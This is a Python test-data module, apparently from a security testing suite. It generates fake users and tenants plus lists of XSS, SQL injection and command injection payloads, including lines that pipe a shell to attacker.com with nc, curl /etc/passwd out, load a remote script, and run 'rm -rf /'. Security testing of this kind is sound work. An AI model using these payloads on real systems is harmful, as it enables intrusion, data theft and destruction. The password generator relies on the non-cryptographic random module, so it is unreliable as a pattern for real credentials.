import random
import string
import uuid
from datetime import datetime, timedelta
import json


class DataGenerator:
    @staticmethod
    def random_string(length=10):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    @staticmethod
    def random_email(domain="techcorp.com"):
        username = DataGenerator.random_string(8)
        return f"{username}@{domain}"

    @staticmethod
    def random_user():
        first_names = ["John", "Jane", "Mike", "Sarah", "David", "Emily", "Chris", "Lisa"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
        departments = ["IT", "Engineering", "Sales", "Marketing", "HR", "Finance"]
        titles = ["Engineer", "Manager", "Analyst", "Specialist", "Coordinator", "Director"]

        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": DataGenerator.random_email(),
            "department": random.choice(departments),
            "title": f"{random.choice(['Senior', 'Junior', ''])} {random.choice(titles)}".strip()
        }

    @staticmethod
    def generate_bulk_users(count=100):
        return [DataGenerator.random_user() for _ in range(count)]

    @staticmethod
    def random_password(length=12):
        """Generate a random password meeting security requirements"""
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        digits = string.digits
        special = "!@#$%^&*"

        # Ensure at least one character from each category
        password = [
            random.choice(lowercase),
            random.choice(uppercase),
            random.choice(digits),
            random.choice(special)
        ]

        # Fill remaining length with random characters
        all_chars = lowercase + uppercase + digits + special
        for _ in range(length - 4):
            password.append(random.choice(all_chars))

        # Shuffle to avoid predictable pattern
        random.shuffle(password)
        return ''.join(password)

    @staticmethod
    def generate_test_scenario_data():
        """Generate comprehensive test scenario data"""
        return {
            "users": DataGenerator.generate_bulk_users(50),
            "auth_tokens": [str(uuid.uuid4()) for _ in range(10)],
            "tenants": [
                {
                    "id": f"tenant_{i:03d}",
                    "name": f"Company {i}",
                    "domain": f"company{i}.com"
                }
                for i in range(1, 6)
            ],
            "departments": ["IT", "Engineering", "Sales", "Marketing", "HR", "Finance", "Operations"],
            "roles": ["admin", "manager", "employee", "viewer"],
            "generated_at": datetime.now().isoformat()
        }


class SecurityDataGenerator:
    @staticmethod
    def xss_payloads():
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "';confirm('XSS');//",
            "<script src=//attacker.com/evil.js></script>"
        ]

    @staticmethod
    def sql_injection_payloads():
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; UPDATE users SET password='hacked' WHERE email='admin@techcorp.com'; --",
            "' UNION SELECT * FROM sensitive_data --",
            "admin'--",
            "' OR 1=1 --",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked'); --",
            "' OR EXISTS(SELECT * FROM users WHERE email='admin@techcorp.com') --",
            "1'; EXEC xp_cmdshell('dir'); --",
            "'; WAITFOR DELAY '00:00:05'; --"
        ]

    @staticmethod
    def command_injection_payloads():
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "| nc attacker.com 4444",
            "; curl http://attacker.com/steal.php?data=$(cat /etc/passwd)",
            "&& ping -c 1 attacker.com",
            "; echo 'hacked' > /tmp/hacked.txt"
        ]